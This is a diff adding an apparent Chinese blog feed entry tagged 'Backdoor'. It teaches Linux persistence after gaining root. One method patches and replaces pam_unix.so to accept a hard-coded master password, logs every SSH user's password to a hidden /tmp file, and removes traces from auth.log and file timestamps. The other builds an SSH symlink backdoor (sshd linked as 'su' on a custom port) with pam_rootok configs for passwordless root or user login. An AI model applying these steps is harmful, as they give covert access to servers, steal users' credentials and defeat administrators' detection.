+&lt;p&gt;确保有安装&lt;strong&gt; gcc 编译器&lt;/strong&gt;和&lt;strong&gt; flex 库&lt;/strong&gt;，&lt;br /&gt;
+&lt;strong&gt;编译&lt;/strong&gt;命令如下：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd Linux-PAM-1.4.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 未防止修改的 so 不正确，先找到原文件&lt;strong&gt;备份&lt;/strong&gt;一个：&lt;/p&gt;
+&lt;p&gt;命令 &lt;code&gt;find / -name &amp;quot;pam_unix.so&amp;quot;&lt;/code&gt;   （找原文件地址）&lt;br /&gt;
+我&lt;strong&gt;原文件&lt;/strong&gt;的地址在：&lt;strong&gt;/usr/lib/x86_64-linux-gnu/security/pam_unix.so&lt;/strong&gt;&lt;br /&gt;
+ 编译出的&lt;strong&gt;新文件&lt;/strong&gt;在：&lt;strong&gt;root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so&lt;/strong&gt;&lt;br /&gt;
+ &lt;code&gt;cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak&lt;/code&gt; （备份在 /tmp/pam_unix.so.bak）&lt;br /&gt;
+ &lt;code&gt;cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so&lt;/code&gt; （复制新 so 文件，覆盖原文件）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;尝试用设定的密码登录：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;（注意登录的需要是已有账户） &lt;code&gt;ssh 已有账户名@192.168.158.128&lt;/code&gt; &lt;br /&gt;
+ 用自定义的 &lt;strong&gt;hello&lt;/strong&gt; 密码，登录 root 成功：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png&#34; alt=&#34;image-20230426005144666&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;不足 &amp;amp; 优化：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;若是管理员&lt;strong&gt;查看登录日志&lt;/strong&gt;：&lt;br /&gt;
+实时查看最后 10 条  &lt;code&gt;tail -f -n 10 /var/log/auth.log&lt;/code&gt; （视具体情况不同，日志也有可能是 /var/log/secure）&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png&#34; alt=&#34;image-20230426005149260&#34; /&gt;&lt;br /&gt;
+ 第一条是从 ssh 输入&lt;strong&gt;正确密码&lt;/strong&gt;登录的日志，第二条是输入&lt;strong&gt;自定义的密码&lt;/strong&gt;登陆的日志，&lt;br /&gt;
+可以看到，第二条会比第一条多出一行记录，&lt;strong&gt;报告验证失败&lt;/strong&gt;，&lt;br /&gt;
+这是因为，在我们添加语句的前一行，先使用了 &lt;strong&gt;_unix_verify_password&lt;/strong&gt; 函数进行了验证：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png&#34; alt=&#34;image-20230426005201757&#34; /&gt;&lt;br /&gt;
+ 既然如此，我们可以找到函数 _unix_verify_password 的&lt;strong&gt;位置&lt;/strong&gt;，在它验证之前，插入之前的那行代码，这样就能够&lt;strong&gt;避免验证密码报错&lt;/strong&gt;。&lt;br /&gt;
+更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png&#34; alt=&#34;image-20230426005205935&#34; /&gt;&lt;br /&gt;
+ 重新编译覆盖之后，ssh 远程登录，查看日志：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png&#34; alt=&#34;image-20230426005213331&#34; /&gt;&lt;br /&gt;
+ 可以看到，第三条就和第一条一样了。&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;若是管理员查看&lt;strong&gt;文件修改的时间&lt;/strong&gt;：&lt;br /&gt;
+可以用 touch -r 命令修改新文件的时间：&lt;br /&gt;
+ &lt;code&gt;touch pam_unix.so -r /tmp/pam_unix.so.bak&lt;/code&gt; （改为备份文件的时间）&lt;br /&gt;
+修改前后用 &lt;code&gt;stat pam_unix.so*&lt;/code&gt;  命令查看结果如下所示：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png&#34; alt=&#34;image-20230426005217672&#34; /&gt;&lt;br /&gt;
+（仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;lt;br&amp;gt;&lt;br /&gt;
+&lt;strong&gt; 效果 2：记录通过 ssh 登录的用户密码：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;同样修改解压目录下的 &lt;code&gt;/modules/pam_unix/pam_unix_auth.c&lt;/code&gt;  文件：&lt;br /&gt;
+在第 173 行下加入，如下图所示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png&#34; alt=&#34;image-20230426005222756&#34; /&gt;&lt;br /&gt;
+ 每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中&lt;/p&gt;
+&lt;p&gt;保存 -&amp;gt; 编译 -&amp;gt; 覆盖 -&amp;gt; 从 ssh 用正常密码登录几次账号，提供记录的数据 -&amp;gt; 查看保存的文件：&lt;br /&gt;
+ &lt;code&gt;cat /tmp/.record_pwd&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png&#34; alt=&#34;image-20230426005227686&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ssh软连接后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh软连接后门&#34;&gt;#&lt;/a&gt; SSH 软连接后门&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;前提&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;getshell，已获得服务器的 root 权限，&lt;/li&gt;
+&lt;li&gt;ssh 配置中开启了 PAM 进行身份验证（验证 PAM 是否开启： &lt;code&gt;cat/etc/ssh/sshd_config|grep UsePAM&lt;/code&gt; ）一般默认开启&lt;/li&gt;
+&lt;li&gt;防火墙关闭，或者开放了使用的端口号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理：&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;软连接简介：&lt;/strong&gt;&lt;br /&gt;
+软链接，就是一个指向另一个档案位置的，特殊的档案。&lt;br /&gt;
+软连接以路径的形式存在。类似于 Windows 操作系统中的&lt;strong&gt;快捷方式&lt;/strong&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;若 ssh 配置中&lt;strong&gt;开启了 PAM 身份验证机制&lt;/strong&gt;，PAM 模块会搜寻相关设定文件（一般在 **/etc/pam.d/&lt;strong&gt;）。&lt;br /&gt;
+而在&lt;/strong&gt; /etc/pam.d/su&lt;strong&gt; 文件中启用了&lt;/strong&gt; pam_rootok.so** 模块。&lt;br /&gt;
+该模块可以使 root 用户直接通过身份认证，&lt;strong&gt;不需要&lt;/strong&gt;输入密码。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当我们指定的端口的软链接文件为 &lt;strong&gt;/ 路径 /su&lt;/strong&gt; 的时候，若从该端口&lt;strong&gt;连接 ssh&lt;/strong&gt;，&lt;strong&gt;PAM&lt;/strong&gt; 就会去路径 &lt;code&gt;/etc/pam.d/&lt;/code&gt;  下找到对应的配置文件，即 **/etc/pam.d/su**，&lt;br /&gt;
+然后使用 &lt;strong&gt;su&lt;/strong&gt; 中启用的&lt;strong&gt; pam_rootok.so&lt;/strong&gt; 模块，实现无密登录。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;创建root账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建root账户&#34;&gt;#&lt;/a&gt; 创建 root 账户&lt;/h3&gt;
+&lt;p&gt;创建 ssh 软链接： &lt;code&gt;ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=端口号&lt;/code&gt; （端口号确保可用）&lt;/p&gt;
+&lt;p&gt;这条命令，先是使用 ln 强制 (-f) 创建，路径为 &lt;code&gt;/usr/sbin/sshd&lt;/code&gt;  文件的软连接 (-s)，并保存为 &lt;code&gt;/usr/local/su&lt;/code&gt;  文件（&lt;strong&gt;路径随意&lt;/strong&gt;、&lt;strong&gt;文件名可变&lt;/strong&gt;），然后把 su 文件（sshd）连到指定的端口&lt;/p&gt;
+&lt;p&gt;其中，创建的软连接名字虽然可变，但是也&lt;strong&gt;不能随便命名&lt;/strong&gt;。可用的名字可以通过命令： &lt;code&gt;find /etc/pam.d|xargs grep &amp;quot;pam_rootok&amp;quot;&lt;/code&gt;  查看：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png&#34; alt=&#34;image-20230426005233857&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;实现-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现-4&#34;&gt;#&lt;/a&gt; 实现：&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png&#34; alt=&#34;image-20230426005237555&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这时候就能从 2333 端口，用 root 身份登入了（ &lt;code&gt;ssh root@192.168.158.128 -p 2333&lt;/code&gt; ）：&lt;br /&gt;
+这里使用 cmd 演示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;创建其它账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建其它账户&#34;&gt;#&lt;/a&gt; 创建其它账户&lt;/h3&gt;
+&lt;p&gt;PAM 中事先是没有供其他用户免密登录的配置文件的，所以，要事先使用下面的命令，用 echo 把引号内的内容保存到 &lt;code&gt;/etc/pam.d/用户名&lt;/code&gt; 的文件里面，让以你的用户名为文件名的配置文件使用&lt;strong&gt; pam_rootok.so&lt;/strong&gt; 模块。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; #%PAM-1.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; auth       sufficient   pam_rootok.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; auth       include      system-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; account    include      system-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; password   include      system-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; session    include      system-auth &amp;quot; &amp;gt;&amp;gt; /etc/pam.d/已有的用户名&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 现在可以看到，在 &lt;code&gt;/etc/pam.d/&lt;/code&gt;  文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为&lt;strong&gt; kali&lt;/strong&gt;）：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png&#34; alt=&#34;image-20230426005247027&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;现在再执行 &lt;code&gt;find /etc/pam.d|xargs grep &amp;quot;pam_rootok&amp;quot;&lt;/code&gt;  命令查找，可以看到，可用的名字已经多了一个&lt;strong&gt; kali&lt;/strong&gt; 了：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png&#34; alt=&#34;image-20230426005254226&#34; /&gt;&lt;br /&gt;
+ 现在再使用命令： &lt;code&gt;ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号&lt;/code&gt; 创建软链接，就能达到普通用户免密登陆的效果&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;实现：&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png&#34; alt=&#34;image-20230426005258790&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png&#34; alt=&#34;image-20230426005304178&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="Backdoor" />
+        <category term="Linux" />
+        <category term="Kali" />
+        <updated>2022-04-02T15:35:57.000Z</updated>
+    </entry>
+</feed>
